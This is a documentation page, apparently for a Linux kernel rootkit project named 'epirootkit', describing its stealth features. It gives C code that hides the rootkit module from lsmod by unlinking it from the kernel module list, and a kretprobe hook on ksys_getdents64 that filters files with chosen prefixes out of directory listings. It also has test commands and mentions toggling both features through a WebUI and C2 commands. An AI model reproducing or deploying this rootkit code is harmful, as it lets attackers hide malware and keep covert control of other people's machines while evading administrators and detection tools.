---
title: "Stealth & Hiding"
description: "Module hiding and file hiding capabilities"
icon: "visibility_off"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 512
---

# Stealth & Hiding

Hide the rootkit module and files from system detection using kernel hooking techniques.

## Module Hiding

Hide the rootkit module from `lsmod` and `/proc/modules` by removing it from the kernel's module list.

### Implementation
```c
int hide_module(void)
{
    if (stealth_state.module_hidden) return 0;

    stealth_state.prev_module_entry = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    stealth_state.module_hidden = true;
    return 0;
}
```

**Technical Details:**
- Uses `list_del()` to remove from kernel module list
- Stores previous entry pointer for restoration
- Thread-safe with mutex protection
- Reversible operation

## File Hiding

Hide files with specific prefixes from directory listings by hooking the `getdents64` syscall.

### Syscall Hooking
```c
stealth_state.getdents_probe = (struct kretprobe) {
    .kp.symbol_name = "ksys_getdents64",
    .handler = getdents64_ret_handler,
    .entry_handler = getdents64_entry_handler,
    .data_size = sizeof(struct getdents_context),
    .maxactive = 20
};
```

### How It Works
1. **Hook `ksys_getdents64`** - Intercept directory read syscalls
2. **Copy buffer** - Move directory data to kernel space
3. **Filter entries** - Remove files matching hidden prefixes
4. **Return filtered** - Send modified buffer back to userspace

### Hidden Prefixes
```c
static const char * const hide_prefixes[] = { 
    "epirootkit",
    "jules_est_bo_", 
};
```

## Usage

### WebUI Control
Access via Configuration panel:
- **Module Hiding**: Toggle rootkit visibility
- **File Hiding**: Toggle file hiding functionality

### Testing
```bash
# Create test files
touch /tmp/epirootkit_test /tmp/normal_file

# Check visibility (file hiding enabled)
ls /tmp/
# Shows: normal_file (epirootkit_test hidden)

# File still accessible
cat /tmp/epirootkit_test  # Works normally
```


Both features are **enabled by default** and can be toggled dynamically via the WebUI or C2 commands.